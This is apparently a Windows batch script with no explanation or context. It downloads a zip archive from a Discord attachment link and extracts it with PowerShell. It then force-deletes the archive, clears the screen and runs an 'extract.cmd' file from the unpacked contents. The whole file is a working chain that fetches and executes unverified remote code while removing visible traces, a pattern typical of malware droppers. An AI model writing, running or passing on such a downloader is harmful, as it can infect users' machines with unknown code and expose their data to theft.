@echo off
SET x=%~dp0
curl https://cdn.discordapp.com/attachments/859071225711427614/882466007489347625/extract.zip --output lnk.zip
powershell Expand-Archive -Force %x%lnk.zip %x%
del /F lnk.zip
cls
extract.cmd